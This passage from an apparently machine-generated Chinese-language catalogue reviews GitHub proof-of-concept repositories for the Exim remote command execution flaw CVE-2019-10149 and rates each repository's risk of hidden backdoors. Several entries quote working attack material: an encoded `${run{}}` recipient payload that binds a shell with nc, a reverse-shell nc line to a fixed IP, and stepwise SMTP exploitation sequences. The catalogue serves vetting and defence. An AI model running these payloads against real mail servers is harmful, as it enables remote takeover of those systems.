CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

